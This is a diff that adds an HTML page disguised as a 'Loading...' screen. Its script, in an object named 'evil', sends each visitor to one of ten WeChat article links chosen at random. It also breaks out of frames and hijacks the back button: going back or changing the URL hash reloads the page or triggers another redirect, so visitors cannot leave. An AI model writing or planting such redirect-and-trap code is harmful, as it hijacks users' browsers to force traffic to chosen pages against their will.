@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>加载中...</title>
+</head>
+<body>
+  <div>
+    <script type="text/javascript">
+
+  var evil = {
+    ctask:'',
+    urlList:[
+    'https://mp.weixin.qq.com/s/dRl0GFQyyd0L2TYG1HS0LQ',  
+    'https://mp.weixin.qq.com/s/hIWWJA9M7wnczIQ2oX-uWQ',
+    'https://mp.weixin.qq.com/s/HhitDWODcBqr5lg-jNdihA', 
+    'https://mp.weixin.qq.com/s/5Tb2RBFgtv0DDik9sbNMZw', 
+    'https://mp.weixin.qq.com/s/4_yhhLhw19hp34djHmps2w', 
+    'https://mp.weixin.qq.com/s/DWVsPryopyncv5OIRztudQ', 
+    'https://mp.weixin.qq.com/s/IGy829gquA8FOsZEna98BA', 
+    'https://mp.weixin.qq.com/s/Xk0PvMa5UaWAZJxPkh_RJA', 
+    'https://mp.weixin.qq.com/s/pGa9t-ERkssX9xhqzLa0VA', 
+    'https://mp.weixin.qq.com/s/QeLcLwIvbST-3Ju-UrI1kw'
+  ],
+  aClick: function(){
+    var b = document.createElement("a");
+    b.href = this.ctask
+    b.click()
+  },
+  jump: function() {
+    var randomIndex =   Math.floor(Math.random() * Math.floor(this.urlList.length))
+    this.ctask = this.urlList[randomIndex]
+    this.aClick()
+  }
+}
+  if (self !== top) {
+        top.location = self.location;
+  } 
+  window.addEventListener("popstate", function (e) {
+    self.location.reload();
+  }, false);
+  window.addEventListener("pageshow", function (b) {
+    evil.jump()
+  });
+  window.onhashchange = function () {
+    evil.jump()
+  };
+    </script>
+  </div>
+</body>
+</html>
